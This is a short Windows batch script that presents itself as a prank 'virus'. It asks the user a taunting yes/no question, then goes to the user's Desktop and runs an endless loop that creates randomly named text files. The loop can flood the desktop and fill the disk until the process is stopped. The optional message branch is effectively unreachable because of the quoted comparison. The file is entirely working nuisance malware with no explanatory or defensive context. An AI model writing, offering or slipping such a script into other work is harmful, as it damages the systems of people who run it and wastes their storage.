@echo off

set /p dumness="hey u just ran a virus ur kinda dum ngl. Y/N"

if %dumness%=="Y" (goto Y)
cd C:\Users\%username%\Desktop
:N
echo %random% > %random%.txt
goto N

:Y
msg * You're a dummy dum dum bum
